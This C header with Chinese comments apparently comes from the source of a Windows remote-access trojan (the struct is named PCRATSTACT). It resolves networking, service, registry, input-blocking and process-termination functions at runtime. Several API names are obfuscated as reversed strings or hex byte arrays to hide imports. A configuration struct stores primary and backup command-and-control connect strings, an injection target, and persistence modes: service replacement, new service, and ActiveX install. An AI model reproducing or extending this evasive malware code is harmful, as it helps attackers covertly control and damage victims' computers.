//主要把动态调用的函数放到这里 
#ifndef   DYNAMICAPI 
  #define    DYNAMICAPI
#include <wininet.h>
#include <winbase.h>
//_CRTIMP int __cdecl strcmpi(const char *, const char *);

typedef int (__cdecl *strcmpiT)(const char *, const char *);

//WINUSERAPI BOOL WINAPI CloseWindow(HWND hWnd);
typedef BOOL  (WINAPI *CloseWindowT)(HWND hWnd);
//SERVICE_STATUS_HANDLE WINAPI RegisterServiceCtrlHandlerA(LPCSTR lpServiceName,LPHANDLER_FUNCTION lpHandlerProc);
typedef SERVICE_STATUS_HANDLE (WINAPI *RegisterServiceCtrlHandlerAT)(LPCSTR lpServiceName,LPHANDLER_FUNCTION lpHandlerProc);

//BOOL WINAPI SetServiceStatus(SERVICE_STATUS_HANDLE   hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
typedef BOOL (WINAPI *SetServiceStatusT)(SERVICE_STATUS_HANDLE   hServiceStatus,LPSERVICE_STATUS lpServiceStatus);

//HANDLE WINAPI OpenEventLogA (LPCSTR lpUNCServerName,IN LPCSTR lpSourceName);
typedef HANDLE (WINAPI *OpenEventLogAT)(LPCSTR lpUNCServerName,IN LPCSTR lpSourceName);

//BOOL WINAPI CloseServiceHandle(SC_HANDLE hSCObject);
typedef BOOL (WINAPI *CloseServiceHandleT)(SC_HANDLE hSCObject);
//BOOL WINAPI DeleteService(SC_HANDLE hService);
typedef BOOL  (WINAPI *DeleteServiceT)(SC_HANDLE hService);

//LONG APIENTRY RegSetValueExA (HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,CONST BYTE* lpData,DWORD cbData);
typedef LONG (APIENTRY *RegSetValueExAT)(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,CONST BYTE* lpData,DWORD cbData);
//INTERNETAPI_(HINTERNET) InternetOpenA(IN LPCSTR lpszAgent,IN DWORD dwAccessType,IN LPCSTR lpszProxy OPTIONAL,
								//	  IN LPCSTR lpszProxyBypass OPTIONAL,IN DWORD dwFlags);
typedef HINTERNET (WINAPI *InternetOpenAT)(LPCSTR lpszAgent,DWORD dwAccessType,LPCSTR lpszProxy OPTIONAL,LPCSTR lpszProxyBypass OPTIONAL,IN DWORD dwFlags);

//int WINAPI GetWindowTextA(IN HWND hWnd, OUT LPSTR lpString,IN int nMaxCount);
typedef int (WINAPI* GetWindowTextAT)( HWND hWnd, LPSTR lpString,int nMaxCount);
//BOOL WINAPI BlockInput( BOOL fBlockIt);
typedef BOOL (WINAPI *BlockInputT)( BOOL fBlockIt);

//BOOLAPI InternetCloseHandle(IN HINTERNET hInternet);
typedef  BOOL (WINAPI *InternetCloseHandleT)(HINTERNET hInternet);
//INTERNETAPI_(HINTERNET) InternetOpenUrlA(HINTERNET hInternet,LPCSTR lpszUrl,LPCSTR lpszHeaders OPTIONAL, DWORD dwHeadersLength,DWORD dwFlags,DWORD_PTR dwContext);
typedef  HINTERNET (WINAPI *InternetOpenUrlAT)(HINTERNET hInternet,LPCSTR lpszUrl,LPCSTR lpszHeaders OPTIONAL, DWORD dwHeadersLength,DWORD dwFlags,DWORD_PTR dwContext);

/*int WSAAPI WSAIoctl(IN SOCKET s,IN DWORD dwIoControlCode,IN LPVOID lpvInBuffer,IN DWORD cbInBuffer,OUT LPVOID lpvOutBuffer,
    IN DWORD cbOutBuffer,
    OUT LPDWORD lpcbBytesReturned,
    IN LPWSAOVERLAPPED lpOverlapped,
    IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    );*/
typedef struct _OVERLAPPED *    LPWSAOVERLAPPEDT;
typedef
void
(CALLBACK * LPWSAOVERLAPPED_COMPLETION_ROUTINET)(
    IN DWORD dwError,
    IN DWORD cbTransferred,
    IN LPWSAOVERLAPPEDT lpOverlapped,
    IN DWORD dwFlags
    );
typedef int  (WINAPI *WSAIoctlT)(IN SOCKET s,IN DWORD dwIoControlCode,IN LPVOID lpvInBuffer,IN DWORD cbInBuffer,OUT LPVOID lpvOutBuffer,
    IN DWORD cbOutBuffer,
    LPDWORD lpcbBytesReturned,
     LPWSAOVERLAPPEDT lpOverlapped,
     LPWSAOVERLAPPED_COMPLETION_ROUTINET lpCompletionRoutine
    );

//LONG APIENTRY RegCloseKey (HKEY hKey);
typedef LONG (WINAPI *RegCloseKeyT)(HKEY hKey);

//WINUSERAPI BOOL WINAPI UnhookWindowsHookEx(IN HHOOK hhk);
typedef BOOL (WINAPI *UnhookWindowsHookExT)(IN HHOOK hhk);
//WINBASEAPI BOOL WINAPI MoveFileExA(IN LPCSTR lpExistingFileName,IN LPCSTR lpNewFileName,IN DWORD dwFlags);
typedef BOOL (WINAPI *MoveFileExAT)(IN LPCSTR lpExistingFileName,IN LPCSTR lpNewFileName,IN DWORD dwFlags);
//WINBASEAPI BOOL WINAPI DisconnectNamedPipe(IN HANDLE hNamedPipe);
typedef BOOL (WINAPI* DisconnectNamedPipeT)(IN HANDLE hNamedPipe);

//WINBASEAPI BOOL WINAPI TerminateProcess(IN HANDLE hProcess,IN UINT uExitCode);
typedef BOOL (WINAPI* TerminateProcessT)(IN HANDLE hProcess,IN UINT uExitCode);
/*
BOOL API InternetReadFile(
    IN HINTERNET hFile,
    IN LPVOID lpBuffer,
    IN DWORD dwNumberOfBytesToRead,
    OUT LPDWORD lpdwNumberOfBytesRead
    );
*/

typedef BOOL (WINAPI* InternetReadFileT)
(
 HINTERNET hFile,LPVOID lpBuffer,
 DWORD dwNumberOfBytesToRead, 
 LPDWORD lpdwNumberOfBytesRead
 );
/*
VOID WINAPI ServiceMain( DWORD dwArgc, LPTSTR* lpszArgv);
*/

typedef VOID (WINAPI* ServiceMainT)( int argc, wchar_t* argv[] );

typedef struct 
{
      strcmpiT pstrcmpiT;            
      CloseWindowT  pCloseWindowT;
      RegisterServiceCtrlHandlerAT pRegisterServiceCtrlHandlerAT;
	  SetServiceStatusT pSetServiceStatusT;
      OpenEventLogAT pOpenEventLogAT;
	  CloseServiceHandleT pCloseServiceHandleT;
	  //DeleteServiceT pDeleteServiceT;
	  RegSetValueExAT pRegSetValueExAT;
	  InternetOpenAT pInternetOpenAT;
	  GetWindowTextAT pGetWindowTextAT;
	  BlockInputT pBlockInputT;
	  InternetCloseHandleT  pInternetCloseHandleT;     
	  InternetOpenUrlAT pInternetOpenUrlAT;
	  WSAIoctlT pWSAIoctlT;
	  RegCloseKeyT pRegCloseKeyT;
	  UnhookWindowsHookExT pUnhookWindowsHookExT;
      MoveFileExAT pMoveFileExAT;
	  DisconnectNamedPipeT pDisconnectNamedPipeT;
	  TerminateProcessT pTerminateProcessT;
      InternetReadFileT pInternetReadFileT;
     ServiceMainT pServiceMainT;
	  void init(){

	    init_user32();
		init_msvcrt(); 
		
	     init_advapi32();

	     init_wininet();

	    init_ws2_32();

	     init_kernel32();    
	      
	  }

	  void init_user32(){
	         pCloseWindowT=( CloseWindowT)GetProcAddress(LoadLibrary("USER32.dll"), "CloseWindow");
	           pGetWindowTextAT=(GetWindowTextAT)GetProcAddress(LoadLibrary("USER32.dll"),"GetWindowTextA");
			    pBlockInputT=(BlockInputT)GetProcAddress(LoadLibrary("USER32.dll"),"BlockInput");
				 pUnhookWindowsHookExT=(UnhookWindowsHookExT)GetProcAddress(LoadLibrary("USER32.dll"),"UnhookWindowsHookEx");
	  }
      void init_msvcrt(){
	       pstrcmpiT = ( strcmpiT)GetProcAddress(LoadLibrary("msvcrt.dll"), "_strcmpi");
	  
	  }
	  void init_advapi32(){
	            pRegisterServiceCtrlHandlerAT=(RegisterServiceCtrlHandlerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"), "RegisterServiceCtrlHandlerA");
	            pSetServiceStatusT=(SetServiceStatusT)GetProcAddress(LoadLibrary("ADVAPI32.dll"), "SetServiceStatus");
	            pOpenEventLogAT=(OpenEventLogAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"OpenEventLogA");
	            pCloseServiceHandleT=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"CloseServiceHandle");
	            //pDeleteServiceT=(DeleteServiceT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"DeleteService");
	            pRegSetValueExAT=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegSetValueExA");
	            pRegCloseKeyT=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegCloseKey");
	        
	  }
	  void init_wininet(){
		    char ch[15];
			char ch1[30];
			ZeroMemory(ch,15);
			ZeroMemory(ch1,30);
			strcpy(ch,"lld.TENINIW");
	       pInternetOpenAT=(InternetOpenAT)GetProcAddress(LoadLibrary(strrev(ch)),"InternetOpenA");
		   ZeroMemory(ch1,30);
			strcpy(ch1,"eldnaHesolCtenretnI");
	       pInternetCloseHandleT=(InternetCloseHandleT)GetProcAddress(LoadLibrary(ch),strrev(ch1));
             	ZeroMemory(ch1,30);
               strcpy(ch1,"AlrUnepOtenretnI");
	      pInternetOpenUrlAT=(InternetOpenUrlAT)GetProcAddress(LoadLibrary(ch),strrev(ch1));
		       ZeroMemory(ch1,30);
               strcpy(ch1,"eliFdaeRtenretnI");
           pInternetReadFileT=(InternetReadFileT)GetProcAddress(LoadLibrary(ch),"InternetReadFile");
	  }
	  void init_ws2_32(){
	     pWSAIoctlT=(WSAIoctlT)GetProcAddress(LoadLibrary("WS2_32.dll"),"WSAIoctl");
	  }
	  void init_kernel32(){
	       pMoveFileExAT=(MoveFileExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"MoveFileExA");
		    pDisconnectNamedPipeT=(DisconnectNamedPipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DisconnectNamedPipe");
			//TerminateProcess
			char ch[]={0x54,  0x65,  0x72,  0x6D,  0x69,  0x6E,  0x61,  0x74,  0x65,  0x50,  0x72,  0x6F,  0x63,  0x65,  0x73,  0x73,  0};
			pTerminateProcessT=(TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),ch);
	  }
	  void init_replace(char* Dllname){                 //替换服务用
	  
	    pServiceMainT=(ServiceMainT)GetProcAddress(LoadLibrary(Dllname),"ServiceMain");
	  }
}DynamicAPI;

//处于何种启动方式
struct  PCRATSTACT
{
	char stact[11];    //标志
	BYTE how;          //1 替换服务 2 新添服务  3 ActiveX安装 4ActiveX启动
	char NUM[64];     //ActiveX  启动标志， 服务启动时保存服务名
	char strDNS[MAX_PATH];          //上线字串 以前的BKLANG
	char strDNS2[MAX_PATH];         //备用的上线字串以前的VSLANG
	char strInject[MAX_PATH];
};
struct MYEVENT
{
	HANDLE DelAlontEvent;           //保护线程退出
	HANDLE UnstallEvent;           //卸载向下继续进行
};
#endif
